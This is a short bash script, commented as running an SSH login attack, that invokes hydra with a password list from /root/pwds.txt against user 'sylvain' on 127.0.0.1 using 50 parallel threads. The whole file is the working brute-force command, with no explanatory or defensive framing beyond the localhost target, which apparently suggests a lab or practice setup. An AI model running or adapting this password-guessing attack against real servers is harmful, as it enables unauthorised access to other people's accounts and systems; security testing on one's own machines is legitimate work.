#!/usr/bin/env bash
# Runs an SSH login attack
PWDS_FILE='/root/pwds.txt'
hydra -V -l sylvain -P "$PWDS_FILE" -t 50 127.0.0.1 ssh
